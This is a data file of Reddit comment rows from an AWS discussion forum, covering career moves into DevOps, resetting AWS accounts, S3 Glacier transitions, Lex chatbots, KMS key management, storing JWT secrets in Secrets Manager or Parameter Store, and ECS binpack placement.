If you want to learn Kubernetes the Linux Foundation course is much better than Linux Academy (albeit potentially more expensive).

For Red Hat certs, books tend to be the way to go.",1.0
g6oi69h,j041h6,"I have a similar past. Sys admin for 7 years then moved into devOps 1.5 years ago. Your mileage may vary but I got in the door by knowing powershell and learning ansible then going to an AWS user group near me and grabbing as many connections as possible from that. I leaned in on those guys and got a position from one of them. Good interviewing is paramount. I made a point to let them know that I had the soft-skills to do the job. I also knew that I wanted to focus on orchestration. I only studied for about two weeks but found a job that gave me the time I needed to learn. 2 years later, I don’t use ansible anymore but I now use AWS with code deploy and azure DevOps for my infrastructure repo. I can pass a few things on. 

1. Did you know that DevOps has not classically been a “position” in a company, but more of a mindset and business practice? Learn SCRUM process and what DevOps means. It will help either way. 

2. Get and use an IDE (I use vs code)and a repo(personally I use but bucket, professionally I use Azure DevOps). It’s not as important what you put there. I used it for powershell scripts at first. But use your ide to edit the files stored in your repo. Use “branches” to make changes and merge them to your master branch to actually commit your final changes. Remember you will be expected to deploy part or all of the code in the org. Learn to restore and manage the code from the repos.

3. Get good with AWS. What part of your knowledge is cool? What about AWS excites you? 

4. Re:Invent is free this year. Do the classes and take time to figure out how a business would implement upcoming technology. 

Finally, a career change is tough. You have to prove that you have the ability to learn and be effective in a position you’ve never worked before. It’s a lot of fun though i love my job more than ever. I can talk on this forever so I hope some of this helps a bit",8.0
g6plr9s,j041h6,"Super reassuring post, I've just moved from sysadmin/infrastructure manager to a new infra team that's going to be heavily devops focused on the coming year. I've never been so excited but obviously apprehensive, thanks for you tips and glad to see others are successfully doing what I'm hoping to do!",1.0
g6ocus3,j041h6,"I'm in a similar situation so I'll tell you what I'm planning and maybe you'll find it useful:

Yes I'm going after certs, but also I have some personal hands on experience with docker, powershell, bash scripting, CRON management etc. I also have work experience as a developer for a couple of years.
I found DevOps tools give you more automation freedom so I was interested in learning them. But because my current job is more on the simple side, I never had any experience with DevOps tools before other than in my personal time with my own labs. So here is my plan for certifications:

* AWS (cloud): I chose AWS cloud for it's much wider use and currently preparing for SAA cert.
* Docker (containers): I'm going for DCA certification from Mirantis which are currently the owners of Docker Enterprise.
* Kubernetes (orchestration): I'm planning on getting the Certified Kubernetes Administrator (CKA) certification.
* Ansible/Puppet (configuration management): I'm pursuing one of the two solutions, and most likely going for Ansible.
* Bonus: Terraform (infrastructure as code): Terraform Associate certification.

That's my current plan. Now keep in mind I'm not planning on taking all of these certs before starting to apply. I'm currently thinking of AWS cert + Docker cert with some Kubernetes experience to start applying for jobs I find interesting. Mainly DevOps and Cloud Architect roles. Hope this helps in any way. And if someone has any advice or tips I'm more than happy to read them.",3.0
g6ox675,j041h6,"If you're starting from scratch. Do the 3 AWS Assoc Certs first.  
  
Don't worry about learning Docker, Kubernetes, Ansible/Puppet, or Terraform right now. AWS has equivalents for that.  
  
After you do AWS, you can learn those other things. At that point, you'll find yourself saying, ""Ok, this is like XYZ in AWS."" In the end, you're going to realize AWS is merely automating pre existing things into code and web console interfaces.",3.0
g6p1fsz,j041h6,"Thanks for the tip.

The reason I'm going for these specific certifications is that I'm looking for the industry standards.
In job openings I always see Kubernetes, docker, ansible and terraform mentioned very frequently. That's why I'm trying to get these certs. I understand that AWS has equivalents for them or even has implementations of them in their ecosystem, but I'm not sure if that is what companies would prefer.

Would you say that these 3 AWS certs would be equivalent or better than the individual ones I mentioned, from an employer point of view?
If so then maybe I'll take them instead. I'm already almost done preparing for SAA so that means one third of the journey is almost done.",1.0
g6oaedd,j041h6,"My view on DevOps is that there’s a slew of possibilities. Some developers don’t care about the Ops side, focusing only on code, others “do it all”. Either way, there’s always people that manage tooling.. think pipelines, infrastructure, etc. These are often considered “Ops” people - their dev work is usually restricted to scripts and automation. 

One way you could use &amp; extend your current skills, and work towards more DevOps-style of working, would be to try to automate everything you can in your current job... make everything “code”, store configurations and build scripts in a GitHub repo, and use tools like Jenkins, Ansible, Chef or Puppet to deploy and maintain everything.

Whenever you have a new problem, do a root-cause analysis and see if you can prevent it next time somehow.

Implement tests to ensure you don’t have invalid configurations before they are rolled out. 

Even if it doesn’t lead to a new role, all that would make your current role easier, and give more time for learning!

For the Dev side specifically, you’ll need to learn at least one programming language.  Pick a language and start learning that. There are many online courses. I find that I learn best when I have a project to work on - personal or work-related. 

As you learn the language try to follow good code management practices from the start.. use git even if you think it’s overkill. Again - learn from doing.",3.0
g6olss1,j041h6,"I was about to post a question not so different from yours, but I'm a step ahead of you so felt I may be of help here..

I currently work in a similar environment in terms of technology stack and I'm just waiting on the ID and criminal records checks are done before my official offer for platform engineer is sent over to me (government body so 1000 hoops to jump through it seems). The role I'm going in to seems to be the bridging point before going full DevOps.

 Obtaining Solutions Architect Associate certification got me the interview, but I think the main things they are looking for are what was highlighted by CuntWizard pretty thoroughly in the previous comment, but in my mind...

IaC - cloudformation, although Terraform is cross platform and seems to be more common in job advertisements.
Config management - if you're like me you're probably a config manager person, but in this world Ansible, puppet or even AWS's config manager are good to investigate.
CI/CD processes - Git, codecommit, codedeploy, code pipeline.
Linux - (I am VERY excited to be binning off MS server and desktop management as I'm sure you are!)

References of learning

This is an ace resource in the form of a flow diagram for an overview of skills - https://roadmap.sh/DevOps 

Pluralsight - I found the AWS courses by Ben Piper to be decent.

I probably haven't added loads that hasn't already been said, but more I just wanted to say that you can totally move across from where you currently are work wise.

Cheers,",2.0
g6otah1,j041h6,"I did this shift a year ago.  Most of my shifts we're mental shifts.... Some of the things that helped me significantly:

 - get use to using either mac or Linux as your desktop.
 - learn git hub, store your scripts there.  This was the biggest shift 
 - find a development t environment.... I found PyCharm really easy to pick up.
 - no moar GUI.... All text base. 
 - get used to either VIM or nano.  
 - you can find everything.  Microsoft abstracts a lot.... Whereas everything in Linux is findable .. somewhere.
 - integration is less tight ..... Microsoft tightly integrates everything, that's your job now.
 - all the stuff the person with the gold said.... Although I WAAAAY prefer terraform to cloud formation as TF doesn't lock me into a cloud provider.",2.0
g6owk7o,j041h6,"Same. Super Junior SysOp who is out of work for Covid doing AWS Certs.  
  
1) /r/AWSCertifications  
2) UDemy Sales. If you need to start now, only buy 1 course at a time.  
3) Stephane Maark's Courses in this order: AWS Solutions Archtect Associates, SysOp Assoc, DevOps Assoc.   
3) Tutorial Dojo's Jon Bonso Exams.  
  
I started in November. I have the SAA and SysOp certs. Working on the DevOps. I had 13 years in IT SysOp and I can program.",2.0
g6pcvzp,j041h6,"If you wanted to transition quickly and seamlessly as possible to get your foot in the door look for Cloud Ops Engineering roles/positions. In my experience as one it’s very close to system engineering. Your generally supporting existing infrastructure in the cloud, configuring backups, making requested changes, etc. Do get your feet wet in using a CI/CD tool (I recommend Gitlab), dabble with some Terraform, and become comfortable using a terminal. A fun lab experiment could be creating a free AWS account, setting up integration from your new AWS account with Gitlab, create a terraform template that deploys an EC2 instance with user data to setup as a lamp stack with it connecting to a backend RDS instance for example. The best thing is you can do this all for free! If you have any questions DM me as I transitioned from a desktop support to the Cloud with no cloud experience in 2017. You would be surprised how often companies are looking for a systems engineer to work in the cloud as troubleshooting backgrounds are becoming harder to come by with everyone wanting to be Devs and not Ops personnel.",1.0
g6zun7w,j041h6,"Thank you to all of you for your responses. I had a look around and it's definitely a long way to go, I have a lot to cover. I'm trying to integrate some of those techs into my daily routine, and especially trying to improve my Linux skills first. 
Before delving deeper into a specific tech I'm trying to get a better understanding of all concepts pertaining to the DevOps way of working. I tend to believe that tech skills can be always acquired by getting your hands dirty, while concepts and principles are far more important and useful in an overall carreer path. Understanding how and why something is done is crucial to being able to give that little bit more in your workplace.

Considering I have no development experience above amateur level, some ideas are a bit alien to me, but I had a look at some of the names you mentioned and do have a little more understanding of how a software development pipeline works.",1.0
g6nyztg,j04atj,"what I did is add a +suffix to my email:

- my.email+acct1@gmail.com
- my.email+acct2@gmail.com
- my.email+acct3@gmail.com",17.0
g6ojist,j04atj,"This is actually a great idea! I'll use this for creating new accounts so that my personal email is not limited to just one account, thanks!",2.0
g6or0wb,j04atj,"makes it easier to sort billing emails, too!",3.0
g6uhcty,j04atj,This is *exactly* how I do my AWS accounts. And I keep a file of them mapped to their account ids and a description of their purpose.,1.0
g6nxrfl,j04atj,"Look for Aws-nuke on GitHub

Edit: https://github.com/rebuy-de/aws-nuke",9.0
g6o3qhb,j04atj,"This is a good idea but I don't think it preserves any default resources, like VPCs. You may need to arrange a config based on a region you haven't used and then copy it to the region you need to really nuke.",3.0
g6uhfp7,j04atj,"Yes. But the ideal, golden Cadillac solution is to always use CF/Terraform/etc so then you can just run a destroy command.",2.0
g6uug3r,j04atj,"Yep! Absolutely better to start with infrastructure as code.  Once you're done nuking or whatever, do your future self a favor and use IaC to give you that capability.",2.0
g6o3hvn,j04atj,"The thought of aws-nuke scares me. It makes total sense for teams using proper DevOps, automation, off provider backups for data and secrets. The thought of a tool that takes a couple commands and shuts down a business is scary.",2.0
g6oi49u,j04atj,I'm there with you. A simple command to kill all services and configuration and take down an organization is veeery scary,1.0
g6nyxnr,j04atj,"AWS doesn’t allow two accounts with the same email (as you know), but you can change the email associated with an account.

You should be able to change the email address associated with this account (while logged in as root) to something that’s not your personal address.

Once it’s changed, you can just open a new account using your personal address again.

Once that’s done, just close the old account to ensure you don’t get charged for any stray resources.",6.0
g6ohsjl,j04atj,"I'll give this a try, sounds like the easiest solution and I hope I can get some free credits to get the account started",2.0
g6o3f77,j04atj,Change the email of the current account.  It will free your personal email to create a new account.,6.0
g6o5tce,j04atj,"I second this. Change the email just before closing the account down. I’ve done this before and signed up again with the same email. 

I’d rather the certainty of this method over anything like AWS Nuke.",3.0
g6ny5n9,j04atj,"I don't know if there is an account nuke button officially provided by AWS, but Google ""nuke AWS account,"" there are tools on GitHub etc. for this.  I have no experience with them though.

Another thing, I don't know if multiple email services support this but just FYI, if gmail, you can use the same address to register multiple accounts by using Gmail aliases.  If your address is myemail@gmail.com, you can register with myemail+myalias@gmail.com (where myalias can be anything) and AWS will accept it as a unique address, but all correspondence will be sent to myemail@gmail.com.",3.0
g6o4af6,j04atj,If you used gmail then sign up for a new account with a . in your email.,1.0
g6nynqa,j04cpc,"I think this Jenkins deployment example using CDK and ECS would be a good reference:  
[https://github.com/aws-samples/jenkins-on-aws/](https://github.com/aws-samples/jenkins-on-aws/)",1.0
g6nx882,j0462w,"When you transition an object to glacier via a lifecycle policy, it will be moved, not copied. Objects will still be visible in S3 though which is how you will restore them if need be. The objects will not appear in the glacier UI when transitioned from S3 so don’t be scared when you don’t see them there. More info if you want the verbose details: https://docs.aws.amazon.com/AmazonS3/latest/dev/lifecycle-transition-general-considerations.html#before-deciding-to-archive-objects",5.0
g6nuzeg,j0462w,"You don't need to expire them, just transition them. Expiring will delete them.",2.0
g6nvjd4,j0462w,"pretty reasonable question, i can't find anywhere in the doco that 100% conclusively answers this question, it's all implied. but i can tell you for sure the transition is a move and not a copy",2.0
g6mz210,j014hj,Could use an SQS queue in between the S3 and lambda. S3 -&gt; sqs -&gt; sqs messages processed by lambda and dequeue messages only on successful db upload. This will preserve the queue of events from S3.,3.0
g6n24aq,j014hj,"Thank you! will learn more about sqs, didn't aws had this.",1.0
g6mx4th,j014hj,"- client requests presigned URL
- client uploads to S3
- client tell server about newly uploaded object

If at any point this fails, client will give an error to the user (or possibly auto retry).  Worst case scenario, there’s an orphaned object in S3, but S3 is so cheap I don’t worry about those.",1.0
g6n2crz,j014hj,"Thanks for this, I haven't fully realized how cheap s3 is.",1.0
g6mhu1w,j000oa,"Lex is basically a front end to a decision tree conversation flow. The ML aspect comes in only on single nodes, e.g. determining whether the user wanted ""create flower order"" or ""cancel flower order"" by doing 'fuzzy matching' on the input. You can have inward and outward integrations to anything.

&gt; I would like to know if I can link the bot to a twitter account or would I have to host a static website and integrate the bot there?

I assume you mean have twitter threads where the user interacts with the bot. You could do probably do this with the Twitter API and something that glues it to the Lex API. I suspect this couldn't be done in 4 days, it would at least be the most time consuming part and possibly not worth it as the 'front end' of a demo.

&gt; What would be the most cost effective way to show off the bot that will still impress recruiters?

Lex is ""serverless""/pay-for-use and the easiest way to create integrations is also serverless (Lambda), it would be hard to write something that costs a lot of money using it for a demo.

Have a look at https://github.com/aws-samples/aws-lex-web-ui for a canned example of what it can do and customise it. It uses a simple web frontend. You could add outbound integrations to other things... maybe SES? DynamoDB?

&gt; Can I set the bot to learn from it's users or is that type of bot one you have to start from scrap?

It uses models to align the user input with the parameters that you set it. Presumably AWS keep those models up to date (via everyone that doesn't click the AI-opt-out...) but I don't think it learns for your specific use case.",1.0
g6mvi6d,j000oa,"Wow thank you for taking the time to give me a very detailed explanation. I understand Lex much better now. In your opinion, what route should I go with this where I can finish it in 4 days and make it impressive?",1.0
g6mxhsq,j000oa,"Check out that repo I linked above and also search that github org for 'lex' for more example code. Use that as a starting point (e.g. copy/paste) and build a website widget that does.. ""something"". Maybe a TODO reminder bot? You could store the todos in DynamoDB (you can integrate ddb with Lex via Lambda). Or maybe find the example Lex code that does ""flower ordering"" and extend it to send a confirmation email via SES, or again integrate with ddb so people can check on their imaginary order.

You get to show off you can write some code, integrate with AWS services and be ""serverless"". The ML text recognition stuff is pretty neat too.",1.0
g6mxy90,j000oa,"Not going to lie to you, this is all a bit overwhelming to me, I looked at the repo and didnt understand it exactly. I think this would be way over my understanding. I don’t mind learning all this but idk if I’ll have enough time to make a workable model by the deadline. I’m also looking at stuff like sageMaker.",1.0
g6mybu3,j000oa,"You don't actually need to build a model, that comes with Lex :) You just give it some examples of what you expect. If you're specifically wanting to show off ML stuff then Lex might not actually be what you want...",1.0
g6myj31,j000oa,"Oh I see, how do users interact with it? I mean like is it hosted on a website? Or is it like an app? Basically where do I put the chatbot",1.0
g6mzpmo,j000oa,"The chatbot is a ""managed service"", it lives on AWS infrastructure. It's all set up for you. You provide it the flow of how you want interactions to go and example phrases that you want it to pick up together with parameters you want to capture. You can then call your own lambdas with the parameters you've captured to make it do things (interact with out AWS services, or external ones).

It doesn't have a UI for user to interact with, you need to provide that yourself. That repo is an example UI that is a website widget that looks like an IM window.",1.0
g6n2piy,j000oa,Oh that’s a great explanation! Thank you for spending so much time to help me out I really appreciate it!,1.0
g6n7ehm,j000oa,No worries :) Good luck experimenting.,1.0
g6mqkj7,izykq3,"Hi -

While Desired Capacity is an editable field, it's advisable that you instead use auto scaling policies to manage your fleet size automatically. When you configure auto scaling policies, Application Auto Scaling will automatically increase and decrease (between the minimum and maximum values configured) the number of AppStream 2.0 instances. Note that AppStream 2.0 is 1 user per 1 instance. If you only need 50 concurrent, then you should set a max value of 50 or higher. Higher will allow your fleet to have some additional capacity for when instances need to be replaced after user sessions.

The AppStream 2.0 admin guide has details about how to configure auto scaling policies here: https://docs.aws.amazon.com/appstream2/latest/developerguide/autoscaling.html.

An easier to consume format for similar information is available on our blog: https://aws.amazon.com/blogs/desktop-and-application-streaming/scale-your-amazon-appstream-2-0-fleets/

Hope this helps.",1.0
g6ontpi,izykq3,Thanks for getting back to me but isn’t desired capacity a required field? Does auto scaling take priority over desired capacity? Maybe I was reading it wrong but I also thought desired capacity was total number of unique users? I thought I had to let the system know how many users we’re going to use it. I thought I read that somewhere but I could be wrong.,1.0
g6oz39i,izykq3,"Desired Capacity is automatically modified by the auto scaling rules. You do not need to tell AppStream 2.0/AWS your total number of users, only concurrency at any given time. The auto scaling rules manages your concurrency.

If you find where you read that desired capacity is similar to the total number of unique users, please send it over - there may be some documentation that need to be changed.",1.0
g6p3o84,izykq3,"1 user per instance at any time (doesn't matter if you have 3000 users, you will need a maximum of 50). please note your limits. for example, the general medium instance type has a limit of 50 instances, but you might have less in your account and you might need to request a limits increase. for autocad, use this guide https://d1.awsstatic.com/end-user-computing/AppStream2-AutoCAD-Deployment-Guide.pdf

iirc correctly, autocad requires beefier graphics instances, so your default limit is 10. if at any time your autoscaler requests instance #11, it will not be able to do so.

https://docs.aws.amazon.com/appstream2/latest/developerguide/limits.html

MUST read: https://docs.aws.amazon.com/appstream2/latest/developerguide/autoscaling.html",1.0
g6lsmt1,iztydd,"My guess is that this is just an outdated billing description.  When the r5 was originally released, the limit was 5000.  Late last year all r5 sizes got a 36% increase so it was upgraded to 6800.",1.0
g6ltzb1,iztydd,"Good info, thank you, because I was more inclined to believe the bill!",1.0
g6ldd4l,izvi0w,"Whaat? You get the application to run your commands against the DB and post process results? Eh?

Surely that's the point of having a database server?

You submit a command to the database engine and the database returns you some results and the tool shows them. And then you can send that command to other people running different database server with the same data and they get the same result.

You surely don't want to be doing local processing on the result set. You don't get a dog so you can wag yourself. You don't get a database server so you can filter your own query results.",0.0
g6lpbho,izvi0w,"I think you may have misunderstood what I was trying to say... Let me rephrase:  


NoSQL Workbench sometimes gives wrong results when a look-up is done using ""contains."" It does not show some records, even though they actually exist.  


Did you think I meant something else?",1.0
g7fhs32,izq3jn,"Take a peek at the Instance Types and Sizing section on page 4 of the document.  That section covers the topic you're hitting on, hope it helps in the future.",1.0
g6l2szn,izu5bi,"It sounds as if the customer wants to grant you access to the bucket via an IAM Role that you can assume from within your own AWS account.    


To do so your customer is probably asking for the RoleArn that you use for your own AWS Account.

Cross Account assume role setups are considered less unsafe than IAM users with key pairs.

[https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial\_cross-account-with-roles.html](https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial_cross-account-with-roles.html)",6.0
g6l4u6u,izu5bi,"Thanks. I just signed up and created a user on my account.  My user has no permissions but has the ARN, I can give that to the customer and when he gives that user access to the bucket I should be able to open that via the web interface?",2.0
g6l56ah,izu5bi,"At the very least your user should have assume role permissions, something like:

`{`

`""Version"": ""2012-10-17"",`  

 `""Statement"": {`

`""Effect"": ""Allow"",`       
`""Action"": ""sts:AssumeRole"",`      
`""Resource"": ""arn:aws:iam::ACCOUNT-ID-WITHOUT-HYPHENS:role/Test*""`     
  `}`  
`}`",2.0
g6l8mie,izu5bi,This depends on whether they are creating a role in the S3 account or granting access directly to the IAM principal in the bucket policy.  Both are possible and require different settings on the non-S3 account.,5.0
g6ldmwr,izu5bi,"Don’t forget if you do this the account you use to assume the role will lose permissions in your account while it’s assuming the role in the other account.

Might not be an issue for you but a Bucket Policy on the target bucket is the better option IMHO.",1.0
g6lcs37,izpybb,"The big difference is that a CMK can be revoked and you have better overall management.

For example say you encrypt a system out data with a particular key, sometime later you become aware of a security incident and need to revoke the key. 

With a CMK you can do this and limit the blast radius of planned ahead of time. With a managed key this isn’t possible.

There are other reasons to use a CMK but that’s probably one of the most impactful.

I highly recommend using CMK with rotation enabled and use keys per solution or whatever logically makes sense.

I tell my teams that Security is easy in AWS, there’s no excuses for being lazy or cutting corners.",7.0
g6lgrea,izpybb,"And what does revocation do in your scenario?

The key still exists. It can still be used to encrypt or decrypt. It just says that it shouldn't be trusted any more. (Assuming there is somewhere that your revocation can be checked. If i revoke a CMK, where does the revocation go. Who checks that revocation list before using a key?)

If I somehow obtain your encrypted data and the compromised key in the future, I can still decrypt your data regardless of revocation.

I can't imagine a scenario where that is useful within a deployment like AWS. If you were sharing the data with a 3rd party, maybe. TBH if it was that big a problem, I'd tear it all down and reencrypt with a new key and delete the old so you can't get it in the future.

Its like ssl certificate revocation. Yes, it is possible, but very few browsers even check for it. Or PGP revocation, it only really works if you know everywhere your key was shared and apply the revocation to it. If someone has downloaded it and doesn't check the keyservers regularly, it has no affect.",2.0
g6lsdj4,izpybb,"You’d have to have obtain the key from KMS to decrypt the data.

KMS keys can’t be used outside the service and should be protected by IAM and policies.

If you revoke the CMK it’s immediately unavailable thereby protecting data and can be deleted after 90 days. After that time data protected by the key cannot be decrypted.

AWS Services that leverage KMS consistently apply the encryption so it’s not like your PGP or browser example.

In Banking, medical, defence and many other industries this is standard practice.",2.0
g6mg5qd,izpybb,That’s not how KMS CMK revocation works. All API calls to Encrypt/Decrypt etc will fail. There’s no revocation list to check,1.0
g6ppn74,izpybb,"In AWS, the general idea is that you would not use a specific key with an ARN but with an alias. 
In order to revoke the key, you would point that alias to a new key you have created and all associated applications will start using the new key as they are using alias. 

Also, you cannot export a key from KMS, you will have to call the AWS service to encrypt/decrypt the data. 

 You can disable a key and it cannot be used for encryption/decryption and schedule a deletion ( min 7 days to max 90 days) once you are done with your analysis.

Ref: https://docs.aws.amazon.com/kms/latest/developerguide/enabling-keys.html",1.0
g6mgdzd,izpybb,"I agree with 99% of what you said - and I’m also a big proponent of using narrowly-scoped key policies for single-purpose tasks. 

That said, is there any utility to key rotation? Or is it just for tick-the-box compliance? I’m not sure how it’s actually useful in practice. You can’t revoke a specific version of a CMK, right?",1.0
g6mln4h,izpybb,"Correct you can’t revoke a particular instance of the key. It does however mean that you have to have a particular instance of the key that matches the data obtained.

The usefulness depends on what you’re doing with the key, for example EBS encryption versus data encryption inside an application.

Given it’s a simple setting and the details are abstracted I recommend people use it. The fact it helps with compliance is just an added benefit.",1.0
g6ncb25,izpybb,"Thanks for the answer, I think I need to go do some research and learn more :)",1.0
g6po2v3,izpybb,"For control, it makes sense. 
Can you please what are the other reasons ?

Thank you for the answer!",1.0
g6qtogh,izpybb,"The other big reasons to use a CMK besides control are:

Importing Key Material
With a CMK you can import key Material generated outside the platform. For example you can generate a key with OpenSSL and import it into KMS for use as a native key ( You own the material and rotation, regeneration)

Limiting Blast Radius 
When revoking a key you can limit the impact. You can’t revoke an AWS managed key and if it was invoked it would cause widespread outages.

Access by another account
You can allow another account to access a CMK in your account. Very useful if you want to protect Software as a Service platforms or centralise key management.

Auditing
You can audit the use of the key (handy if it’s used by another AWS Account) or if it’s been disabled.",2.0
g6ld330,izpybb,"https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html#master_keys

&gt; You have full control over these CMKs, including establishing and maintaining their key policies, IAM policies, and grants, enabling and disabling them, rotating their cryptographic material, adding tags, creating aliases that refer to the CMK, and scheduling the CMKs for deletion. 

If you want to do any of that, or if you want to be able to segment your keys (for instance, having one more-locked down and heavily-audited CMK that you use for the most sensitive S3 objects), then you would need to use a customer managed CMK.

They are not inherently more or less secure. They offer different levels of control.",2.0
g6llhki,izpybb,The AWS managed keys provide data protection in the event an AWS facility is physically breached and disks are actually taken. You don't have the policy controls on usage that the CMK gives you. The AWS key is a check-the-box compliance feature. Just use a CMK and enable automatic rotation.,2.0
g6o7hva,izpybb,"When we last spoke to our TAM about this, which admittedly was a while ago, one of the major differences was that requests to AWS managed keys didn’t count against a quota, while CMK requests did.  This may no longer be the case, but it is worth considering.",1.0
g6qsef9,izpybb,"That’s correct and could matter for some customers. Customer Manager Keys do incur a fee while AWS managed keys don’t.

If you are encrypting an EBS volume or S3 bucket the cost is trivial however if you using the key in an API call to encrypt application data regularly that might be something to take into account depending on volumes etc.",1.0
g6l0dr9,izt4ok,"This page has the information you need: https://docs.aws.amazon.com/autoscaling/ec2/userguide/healthcheck.html

The load balancer will wait until the end of the grace period, then perform a health check. If the health check passes the instance will be considered in service by the load balancer.",2.0
g6mxudu,izt4ok,"To clarify, health checks start right away, and can succeed before grace period is over. ASG will wait until the grace period ends before acting on a failing health check.",1.0
g6l1fis,izt4ok,"As I recall, InService doesn't care about userdata scripts. If you don't want your instance to be seen as InService until after your script executes, you'll need to create an ASG lifecycle hook for EC2_INSTANCE_LAUNCHING and complete the lifecycle action at the end of your userdata script.",2.0
g6uj3gz,izt4ok,"And as long as the lifecycle action is still pending, will autoscaling still consider the scaling action ongoing?",1.0
g6uxapd,izt4ok,"Yes. During scale out with a lifecycle hook in play, the scaling action is not complete until the lifecycle hook is resolved, either by a receiving a completion signal or by timing out.

This page from the docs will help you: https://docs.aws.amazon.com/autoscaling/ec2/userguide/lifecycle-hooks.html",1.0
g6kqawr,izsd21,"Secrets Manager

Hashicorp Vault",64.0
g6kqgof,izsd21,"I was just reading about secrets manager, that looks like it's probably exactly what I'm looking for.",13.0
g6lc4tv,izsd21,"Secrets Manager is great when you need to be able to automatically rotate a password with a service like RDS. If you just need a place to securely store a static password, storing in Parameter Store using a SecureString will be cheaper.

Secrets Manager is basically Parameter Store + a Lambda to rotate the password for you.",26.0
g6kroqx,izsd21,Parameter store,67.0
g6l21ry,izsd21,Parameter Store for sure. Cheaper than the Secrets Manager.,20.0
g6m32dv,izsd21,"Cheaper, yes, but no rotation, generation or across account access. So it depends on what you're looking for.",11.0
g6oe9ke,izsd21,"Seriously, is it not possible to access the SSM across the account?",1.0
g6n3gn9,izsd21,Vault open-source is free,-5.0
g6nxmqe,izsd21,You need to host it,2.0
g6mdbup,izsd21,"SSM params are like one of the hidden secrets of AWS it seems like.

&amp;#x200B;

We use SSM params to do some super tricky stuff; rendering Helm-charts with deployment/env-specific config, getting config out of Terraform and into GitLab CI/Python/Bash/Serverless -- literally anything whatsoever The simple fact that they have paths makes them so convenient for everything",3.0
g6o1ot0,izsd21,"I wish parameter store secret string was supported by cloudformation; we still can't update them without a custom lambda.  Secrets manager on the other hand is supported, but we don't always go for Secrets  manager.",1.0
g6o2bl7,izsd21,It never will be. You'd end up with the secret in plain text in the CF doc.,2.0
g6l90ff,izsd21,"AWS SSM Parameter Store 

https://docs.aws.amazon.com/systems-manager/latest/userguide/sysman-paramstore-securestring.html",11.0
g6ltlsx,izsd21,Where is the JWT coming from? It should be signed and verifiable w/ a public key.,9.0
g6m34yf,izsd21,"Under rated answer here. You still need to protect your private key, but you should avoid doing HS/shared private key JWTs and use es/rs asymmetric key ones.",4.0
g6ksuzp,izsd21,"Secret manager with hashicorp vault would be an external solution.

If you want to stay in AWS, use an AWS parameter store, encrypt your secret with a custom KMS key, grant access to your lambda to read the KMS key and to get the secret and you’re done.",14.0
g6ksyy4,izsd21,"If you've ever used this, is the time cost to retrieve the key fairly negligible?",3.0
g6l1m0s,izsd21,"Yes. I have Lambda's that finish in 100ms that make a call to Secrets Manager. One cost cutting tip; since each read of a secret costs you money, load the secret outside of your handler. If your lambda stays warm, the secret will stay in memory.",20.0
g6ma6s3,izsd21,Yeah cache it in the init and maybe use a loading cache with a TTL.,1.0
g6ktevc,izsd21,"Follow up question, would I need hashicorp with Secrets Manager?  That seems at first glance to be enough on it's own?",2.0
g6ktpi8,izsd21,Either/or,2.0
g6nlk46,izsd21,"Both grant the same results: secrets with key versioning

What would make you to go for one or another would be:
- price: on top of hash vault you won’t have linear fees
- simplicity: do you want to bother managing hash vault?
- additional features: hash vault solution has other features, do you care about them?",1.0
g6llgn1,izsd21,"You have a couple of options:

1- Secrets Manager: Comes at an additional cost. Can rotate keys for you. You can create it via Cloudformation.

2- SSM Parameter Store (SecureString): Does not come with any additional cost. Can not rotate the keys. SecureString can not be created via Cloudformation

Note that both options do not work cross account. So you will have to create and use cross account roles if your functions span multiple accounts",3.0
g6nwbl4,izsd21,"Secrets Manager definitely works cross account, given your secret's resource policy and kms key policy are correct.",2.0
g6li2o4,izsd21,"According to some people, a public S3 instance.",5.0
g6ly3qo,izsd21,I had a dev do this the other day. I introduced him to cognito.,2.0
g6m1zx8,izsd21,Didn't browserstack do this at one point?,1.0
g6lepes,izsd21,"Secrets Manager, Parameter Store, KMS or Dynamo DB.",2.0
g6lkklk,izsd21,Aws parameter store is easier to use than secret manager and can hold encrypted strings as well,2.0
g6lyceb,izsd21,Can you not use Cognito to supply this auth rather than using your own JWT token?,2.0
g6kwadr,izsd21,"definitely secrets manager. It integrates well with other services, such as RDS and IAM roles/policies. It even gives you some boilerplate code to retrieve the secret.",2.0
g6lo3qs,izsd21,"Parameter Store in SSM is cheaper than Secrets. 

Especially if you are just doing a single value.",1.0
g6n45r5,izsd21,"Not sure if your question makes sense - JWT tokens are *signed* with a private key, not *verified* by one. The key you use to verify the token is a public token, and doesn’t need to be stored in a secrets manager.",1.0
g6nm0ae,izsd21,"another way additionally to what has been said. you can put it into an s3 bucket encrypted with a customer created  (kms) key and restrict access to the key  only to those who need it. the bucket and key can be shared with other accounts.

but if it works for you parameter store would be the easiest solution",1.0
g6nm385,izsd21,"If you verify the jwt in a lambda authorizer you only need 1 lambda to have access to the key that then gives in permissions to downstream lambdas. You can then cache the token outside the handler in that lambda so you don’t have to fetch the secret many times. 
But as others have pointed out, your jwt should be verifiable with a public key anyway.",1.0
g6lw41d,izsd21,For regions that don't have Secrets Manager or Parameter Store we use [Credstash](https://github.com/fugue/credstash).,1.0
g6ly9e4,izsd21,[deleted],0.0
g6lzhpp,izsd21,"Stop shilling your site, it's not even related to the question",2.0
g6l5rx8,izsd21,"You should look into whether you can just use KMS directly. KMS can now do asymmetric signatures so you wouldn’t even need to store/fetch the key directly. The downside is that if this is a high TPS service, you could hit throttle/cost issues. But if you have a low request volume this would probably be the simplest and most secure option.",-3.0
g6laccu,izsd21,"KMS

Edit: to clarify, not ""kill myself"", AWS Key Management Service",-5.0
g6lazxm,izsd21,KMS is not a place to store data.,3.0
g6lb539,izsd21,"Facts, confused myself.",1.0
g6ld7sm,izsd21,"Trick question. You can't share a secret or it becomes just another key.

Seriously though, LastPass.",-10.0
g6klm12,izmzqv,"I guess you have to use ConditionExpression and check attributes there before updating

[https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Expressions.ConditionExpressions.html#Expressions.ConditionExpressions.SimpleComparisons](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Expressions.ConditionExpressions.html#Expressions.ConditionExpressions.SimpleComparisons)",2.0
g6kk50m,izr1sb,"""binpack"" is a word used in manufacturing and shipping and computing, to refer to the bin packing problem:  how can we arrange \[pack\] these \[items\] to make them fit the fewest number of containers \[bins\]?""[https://en.wikipedia.org/wiki/Bin\_packing\_problem](https://en.wikipedia.org/wiki/Bin_packing_problem)

From the AWS documentation on the binpack strategy: "" Tasks are placed on container instances so as to leave the least amount of unused CPU or memory. This strategy minimizes the number of container instances in use. """,7.0
g6kpee8,izr1sb,"More info:

You use this strategy when you want to reduce the number of EC2 instances you use.

